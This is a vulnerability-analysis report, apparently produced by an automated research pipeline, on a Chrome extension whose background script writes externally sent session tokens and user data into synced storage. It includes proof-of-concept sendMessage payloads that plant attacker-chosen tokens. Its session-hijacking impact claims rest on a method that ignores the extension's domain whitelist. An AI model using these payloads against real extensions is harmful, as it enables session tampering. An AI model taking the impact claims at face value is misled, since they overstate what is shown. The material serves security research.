# CoCo Analysis: fnhpgocfaajkkmhpmkklgddldacjeklm

## Summary

- **Overall Assessment:** TRUE POSITIVE
- **Total Sinks Detected:** 2

---

## Sink 1: bg_chrome_runtime_MessageExternal → chrome_storage_sync_set_sink (request.user)

**CoCo Trace:**
```
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/fnhpgocfaajkkmhpmkklgddldacjeklm/opgen_generated_files/bg.js
Line 1008    chrome.storage.sync.set({ swpelyNewSession: request.token, user: request.user }, () => {
    request.user
```

**Code:**

```javascript
// Background script (bg.js) - Line 992-1014
chrome.runtime.onMessageExternal.addListener((request, _sender, sendResponse) => {
  console.info('onMessageExternal: ', request);

  // request to remove session token
  // when loggin out
  if (request.message === 'swpelyRemoveSession') {
    chrome.storage.sync.set({ swpelyNewSession: null }, () => {
      sendResponse({ message: 'Success removing session' });
    });

    return true;
  }

  // request to add new session token
  // when logging in
  if (request.message === 'swpelyNewSession' && request.token) {
    chrome.storage.sync.set({ swpelyNewSession: request.token, user: request.user }, () => { // ← attacker-controlled
      sendResponse({ message: 'Success adding new session' });
    });

    return true;
  }
});
```

**Classification:** TRUE POSITIVE

**Attack Vector:** External Messages via chrome.runtime.onMessageExternal

**Attack:**

```javascript
// From any of the whitelisted domains in manifest.json:
// "https://app.swpely.com/*", "https://staging.swpely.com/*", "https://api.swpely.com/*", etc.

chrome.runtime.sendMessage(
  'fnhpgocfaajkkmhpmkklgddldacjeklm',
  {
    message: 'swpelyNewSession',
    token: 'malicious_token',
    user: { evil: 'payload' }
  }
);
```

**Impact:** Attacker can poison chrome.storage.sync by injecting arbitrary data into the `swpelyNewSession` and `user` storage keys. While this is storage poisoning, it represents a complete storage exploitation chain because the stored session data is used for authentication and would be retrieved by the extension for subsequent operations. Even though manifest.json restricts externally_connectable to specific domains, per the methodology we ignore these restrictions - if even ONE website can trigger this flow, it's a TRUE POSITIVE.

---

## Sink 2: bg_chrome_runtime_MessageExternal → chrome_storage_sync_set_sink (request.token)

**CoCo Trace:**
```
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/fnhpgocfaajkkmhpmkklgddldacjeklm/opgen_generated_files/bg.js
Line 1007    if (request.message === 'swpelyNewSession' && request.token) {
    request.token
```

**Code:**

```javascript
// Background script (bg.js) - Same handler as Sink 1
chrome.runtime.onMessageExternal.addListener((request, _sender, sendResponse) => {
  if (request.message === 'swpelyNewSession' && request.token) {
    chrome.storage.sync.set({ swpelyNewSession: request.token, user: request.user }, () => { // ← attacker-controlled token
      sendResponse({ message: 'Success adding new session' });
    });

    return true;
  }
});
```

**Classification:** TRUE POSITIVE

**Attack Vector:** External Messages via chrome.runtime.onMessageExternal

**Attack:**

```javascript
// From any of the whitelisted domains
chrome.runtime.sendMessage(
  'fnhpgocfaajkkmhpmkklgddldacjeklm',
  {
    message: 'swpelyNewSession',
    token: 'attacker_controlled_session_token',
    user: { id: 'evil_user' }
  }
);
```

**Impact:** Attacker can inject malicious session tokens into chrome.storage.sync. The extension uses this token for authentication with the Swpely service, allowing session hijacking or impersonation attacks. This is a complete storage exploitation chain as the poisoned session data will be retrieved and used in subsequent authentication operations.
